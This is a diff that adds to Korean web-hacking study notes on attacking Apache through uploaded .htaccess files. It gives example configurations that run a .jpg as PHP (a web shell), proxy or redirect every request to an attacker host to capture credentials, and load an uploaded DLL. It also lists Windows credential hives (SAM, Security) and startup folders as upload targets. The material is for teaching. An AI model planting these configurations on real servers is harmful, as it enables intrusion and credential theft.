@@ -127,3 +127,79 @@
             - ```AllowOverride```와 ```AllowOverrideList``` 지시어를 통해 명시한 지시어만 사용할 수 있음 (참고: [AllowOverride Documentation](https://httpd.apache.org/docs/2.4/ko/mod/core.html#allowoverride))
 
 * .htaccess 파일을 이용해 공격하는 방법
+    - 웹 셸: ```.php``` 확장자 이외의 다른 확장자를 PHP 스크립트로 해석하도록 설정을 변경 (확장자 우회)
+        + ```<Files>``` 섹션을 이용한 확장자 우회 예시 (참고: 📚 [Apache \<File\> Directive](https://sidoservice.seoul.go.kr/manual/ko/mod/core.html#files), 📚 [Apache Sections manual](https://sidoservice.seoul.go.kr/manual/ko/sections.html))
+            ```Apache
+            <Files "webshell-dreamhack.jpg">
+                # php-fpm (PHP FastCGI Process Manager)을 사용하는 경우
+                SetHandler "proxy:fcgi://locatlhost"
+                # Apache2 자체 mod_php를 사용하는 경우
+                SetHandler application/x-httpd-php
+            </Files>
+            ```
+            - ```<Files>``` 섹션에 포함된 지시어들은 어떤 디렉토리에 있는지 관계없이 지정한 이름을 가진 파일에 적용됨
+                + 위치와 관계 없이 "webshell-dreamhack.jpg"이란 이름을 가진 파일에 대한 요청이 들어오면 ```SetHandler```에 의해 명시된 핸들러가 처리함
+    - 요청 리다이렉트: 모든 요청을 공격자의 웹 서버로 전달하도록 설정을 변경
+        + 공격자 서버 리다이렉트 예시
+            ```Apache
+            RewriteEngine On
+            RewriteOptions inherit # 부모의 설정을 상속받음 (inherit)
+
+            # mod_proxy_fcgi를 사용하는 경우 FastCGI 서버로 요청 프록시
+            RewriteRule (.*) fcgi://attacker.example.com.$1 [P]
+
+            # mod_proxy_http를 사용하는 경우 HTTP 서버로 요청 프록시
+            RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [P]
+
+            # HTTP Redirect 적용
+            RewriteRule (.*) http://%{HTTP_HOST}at.attacker.example.com.$1 [R=302, L]
+
+            # 에러 페이지를 공격자의 웹 페이지로 리다이렉트함
+            ErrorDocument 404 https://attacker.dreamhack
+            ```
+            - 사용한 지시어 설명
+                | 지시어 | 설명 | 참고 |
+                |---|-----|---|
+                | RewriteEngine | Runtime Rewriting Engine을 활성화(On) 또는 비활성화(Off)함 | 📚 [RewriteEngine Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriteengine) |
+                | RewriteOptions | 현재 서버별 또는 디렉토리별 구성에 대한 일부 특수 옵션을 설정함 (inherit, AllowAnyURI, MergeBase 중 하나만 될 수 있음) | 📚 [RewriteOptions Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriteoptions) | 
+                | RewriteRule | Rewrite Engine에 대한 규칙을 정의함 <br/> &nbsp;&nbsp; - 형식: ```RewriteRule Pattern Substitution [flags]``` | 📚 [RewriteRule Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_rewrite.html#rewriterule) |
+                | ErrorDocument | 문제/오류 발생 시 다음의 네 가지 중 하나를 수행하도록 함 <br/> &nbsp;&nbsp; - 하드코딩된 간단한 오류 메시지 출력 <br/> &nbsp;&nbsp; - 커스텀한 메시지 출력 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 내부적으로 로컬 URL 경로로 리다이렉션 <br/> &nbsp;&nbsp; - 문제/오류 처리를 위해 외부 URL로 리다이렉션 | 📚 [ErrorDocument Directive](https://httpd.apache.org/docs/2.2/ko/mod/core.html#errordocument) |
+        + 요청 중에 계정 정보를 포함한 민감한 정보가 포함되어 있다면 이를 또 다른 목적으로 사용할 수 있음
+    - 공유 라이브러리: 사전에 업로드한 라이브러리 파일을 로드해 임의 코드를 실행할 수 있도록 설정을 변경
+        + C:\www 디렉터리 내 파일들을 조작할 수 있어야 공격에 성공할 수 있음
+        + 변경 사항을 웹 서버에 반영하기 위해서는 서비스 재시작이 필요함
+        + 공유 라이브러리 로드 예시
+            ```Apache
+            # 서버가 재시작할 때 C:\www\path\injected\library.dll을 읽어들여 임의 코드를 실행함
+            LoadFile "C:\www\path\injected\library.dll"
+            ```
+            - 사용한 지시어 설명
+                | 지시어 | 설명 | 참고 |
+                |---|------|---|
+                | LoadFile | **서버가 시작하거나 재시작할 때** 지정한 목적 파일이나 라이브러리를 읽어들임(link in) <br/> &nbsp;&nbsp; - 형식: ```LoadFile filename [filename ...]``` | 📚 [LoadFile Directive](https://httpd.apache.org/docs/2.2/ko/mod/mod_so.html#loadfile) |
+
+<br/>
+
+> #### **Apache Web Server의 지시어 목록**
+> 표준 아파치 배포판에서 사용 가능한 지시어의 목록은 [여기](https://httpd.apache.org/docs/2.2/ko/mod/directives.html#R)에 정리되어 있으며, 각 지시어를 클릭하면 상세 설명을 볼 수 있음
+
+<br/>
+
+### 파일 업로드 공격에서 이용할 수 있는 파일 목록
+* 임의의 경로로 높은 권한을 획득했을 때 이용할 수 있는 시스템 파일
+    | 파일 | 설명 |
+    |---|------|
+    | C:\Windows\System32\config\systemprofile | ```NT AUTHORITY\SYSTEM```의 사용자 프로필 계정 <br/> &nbsp;&nbsp; - Linux의 ```/root```에 대응됨 |
+    | C:\Windows\System32\config\System <br/> C:\Windows\System32\config\System.alt <br/> C:\Windows\System32\config\System.log <br/> C:\Windows\System32\config\System.sav | ```HKEY_LOCAL_MACHINE\SYSTEM``` 레지스트리 키에 해당하는 하이브 파일 <br/> &nbsp;&nbsp; - 주요 시스템 설정 정보를 저장함 |
+    | C:\Windows\System32\config\Software <br/> C:\Windows\System32\config\Software.log <br/> C:\Windows\System32\config\Software.sav | ```HKEY_LOCAL_MACHINE\SOFTWARE```레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 설치된 소프트웨어에서 사용됨 |
+    | C:\Windows\System32\config\SAM <br/> C:\Windows\System32\config\SAM.log <br/> C:\Windows\System32\config\SAM.sav  | ```HKEY_LOCAL_MACHINE\SAM``` 레지스트리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 사용자 비밀번호 및 인증 정보 등을 저장함 <br/> &nbsp;&nbsp; - SAM: Security Account Manager의 약자 |
+    | C:\Windows\System32\config\Security <br/> C:\Windows\System32\config\Security.alt <br/> C:\Windows\System32\config\Security.log <br/> C:\Windows\System32\config\Security.sav | ```HKEY_LOCAL_MACHINE\Security``` 레지스터리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 윈도우의 보안 데이터베이스를 저장함 |
+    | C:\Windows\System32\config\Default <br/> C:\Windows\Sytsem32\config\Default.log <br/> C:\Windows\System32\config\Default.sav | ```HKEY_USERS\DEFAULT``` 레지스터리 키에 대응하는 하이브 파일 <br/> &nbsp;&nbsp; - 사용자별 레지스크리 키의 기본 구조를 지정함 |
+
+* 일반 권한으로 접근할 수 있는 설정 파일
+    | 파일 | 설명 |
+    |---|------|
+    | %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup | 현재 사용자의 시작 프로그램 목록이 저장됨 |
+    | %ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp | 모든 로컬 사용자의 시작 프로그램 목록이 저장됨 |
+
+<br/><br/>
